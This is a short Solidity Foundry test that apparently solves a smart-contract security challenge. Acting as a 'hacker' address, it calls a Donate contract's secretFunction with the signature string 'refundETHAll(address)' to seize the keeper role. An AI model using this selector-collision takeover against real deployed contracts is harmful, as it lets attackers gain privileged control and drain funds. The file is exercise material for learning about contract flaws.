// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testDonate() public {
        vm.startPrank(hacker);

        //--- Hack Time ---
        console.log("hacker : ",hacker);

        donate.secretFunction("refundETHAll(address)");

        console.log("keeper : ",donate.keeper());
        // ----------------

        assertEq(donate.keeperCheck(), true, "Keeper should return true");

    }
}